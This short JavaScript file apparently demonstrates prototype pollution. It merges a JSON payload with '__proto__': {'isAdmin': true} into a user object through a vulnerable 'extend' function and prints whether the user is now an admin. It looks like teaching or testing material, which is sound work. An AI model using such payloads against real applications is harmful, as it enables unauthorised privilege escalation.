// Require the vulnerable package
const extend = require('./extend');

// Define the user object
let user = {
  name: 'user',
};

// Malicious data from an untrusted source
let maliciousData = JSON.parse('{"__proto__": {"isAdmin": true}}');

// Merge the user object with the malicious data
let updatedUser = extend(user, maliciousData);

// Check if the user is now an admin
if (user.isAdmin) {
  console.log('The user is an admin!'); // This will be executed due to prototype pollution
} else {
  console.log('The user is not an admin');
}